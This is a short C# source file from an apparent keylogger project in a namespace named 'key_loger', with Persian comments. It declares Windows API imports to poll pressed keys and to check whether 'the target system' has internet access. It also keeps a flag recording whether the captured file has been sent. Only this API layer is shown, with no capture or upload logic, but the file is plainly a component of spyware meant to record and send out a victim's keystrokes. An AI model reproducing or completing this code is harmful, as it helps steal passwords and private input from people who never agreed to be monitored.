using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;

namespace key_loger
{
    class API
    {
        /// <summary>
        /// کلیدهای فشار داده شده را تشخیص می دهد.اگر کلیدی فشار داده شده بود مقدار یک را بر می گرداند
        /// </summary>
        /// <param name="_key_ascii_code"></param>
        /// <returns></returns>
        [DllImport("user32.dll", EntryPoint = "GetAsyncKeyState")] 
        public static extern int tell_key(int _key_ascii_code);

        /// <summary>
        /// مشخص می کند که آیا فایل ارسال شده است یا خیر اگر فایل ارسال شده باشد این متغیر یک شده است
        /// </summary>
        public static int _if_sent = 0;

        /// <summary>
        /// صفر یعنی خاموش یک یعنی روشن
        /// </summary>
        public static int _if_capslock_pressed = 0;

        /// <summary>
        /// مشخض می کند که آیا سیستم مورد نظر به اینترنت متصل است یا نه
        /// </summary>
        /// <param name="Description"></param>
        /// <param name="ReservedValue"></param>
        /// <returns></returns>
        [DllImport("wininet.dll", EntryPoint = "InternetGetConnectedState")]
        public static extern bool IsConnectedToInternet(out int Description, int ReservedValue);
        }
}
